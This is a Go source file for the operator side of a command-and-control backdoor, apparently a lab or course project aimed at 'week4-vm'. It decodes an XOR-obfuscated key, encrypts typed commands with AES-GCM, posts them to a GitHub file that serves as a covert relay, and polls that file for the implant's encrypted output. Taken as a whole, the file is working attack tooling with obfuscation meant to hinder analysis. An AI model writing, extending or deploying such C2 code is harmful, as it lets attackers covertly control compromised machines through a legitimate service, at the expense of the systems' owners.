package main

import (
	"bufio"
	"c2project/pkg/encryption"
	"c2project/pkg/github"
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"
)

var scrambledKey = []byte{0x99, 0x15, 0xf5, 0x28, 0x9d, 0x15, 0xa7, 0x24, 0x9f, 0x12, 0xfb, 0x25, 0xca, 0x43, 0xf2, 0x23, 0xce, 0x47, 0xf5, 0x23, 0x9c, 0x40, 0xf4, 0x26, 0xc9, 0x40, 0xf5, 0x26, 0x9c, 0x47, 0xf4, 0x72, 0xca, 0x15, 0xa2, 0x29, 0x99, 0x17, 0xf5, 0x25, 0x9d, 0x16, 0xf4, 0x22, 0x9b, 0x43, 0xa1, 0x75, 0x99, 0x14, 0xfb, 0x22, 0xcc, 0x14, 0xa0, 0x29, 0xce, 0x11, 0xfb, 0x27, 0x9b, 0x11, 0xf7, 0x72}
var xorKey = []byte{0xAF, 0x22, 0xC3, 0x11}

func main() {
	key := string(encryption.XORTransform(scrambledKey, xorKey))
	reader := bufio.NewReader(os.Stdin)

	fmt.Println("--- Evil And Malicious Backdoor Console ---")
	fmt.Println("Target: week4-vm | Protocol: GitHub + AES-GCM Encryption")

	for {
		fmt.Print("c2 > ")
		input, _ := reader.ReadString('\n')
		command := strings.TrimSpace(input)

		if command == "" {
			continue
		}
		if command == "exit" || command == "quit" {
			break
		}

		// prep the payload
		timestamp := time.Now().Unix()
		payload := fmt.Sprintf("%d|%s", timestamp, command)

		// encrypt the payload
		encryptedPayload, err := encryption.EncryptString(payload, key)
		if err != nil {
			fmt.Println("[-] Error encrypting command:", err)
			continue
		}

		oldContent, err := github.ReadFile("commands.txt")
		if err != nil {
			fmt.Printf("[-] Error reading old file content: %v\n", err)
			continue
		}

		err = github.WriteFile("commands.txt", oldContent, encryptedPayload)
		if err != nil {
			fmt.Printf("[-] Error sending command: %v\n", err)
			continue
		}

		fmt.Println("[*] Command sent. Waiting for agent check-in...")
		waitForResult(encryptedPayload, timestamp, key)
	}
}

func waitForResult(oldEncryptedPayload string, sentTimestamp int64, key string) {
	for {
		time.Sleep(5 * time.Second)

		content, err := github.ReadFile("commands.txt")
		if err != nil {
			fmt.Printf("[-] Error reading file content: %v\n", err)
			continue
		}

		if content == oldEncryptedPayload {
			// no update yet
			continue
		}

		// decrypt the content
		decrypted, err := encryption.DecryptString(content, key)
		if err != nil {
			fmt.Printf("[-] Error decrypting content: %v\n", err)
			continue
		}

		// unencode the response format (timestamp|output)
		parts := strings.SplitN(decrypted, "|", 2)
		if len(parts) != 2 {
			fmt.Println("[-] Invalid response format")
			continue
		}

		receivedTimestamp, _ := strconv.ParseInt(parts[0], 10, 64)

		if receivedTimestamp == sentTimestamp {
			fmt.Println(parts[1])
			return
		}
	}
}
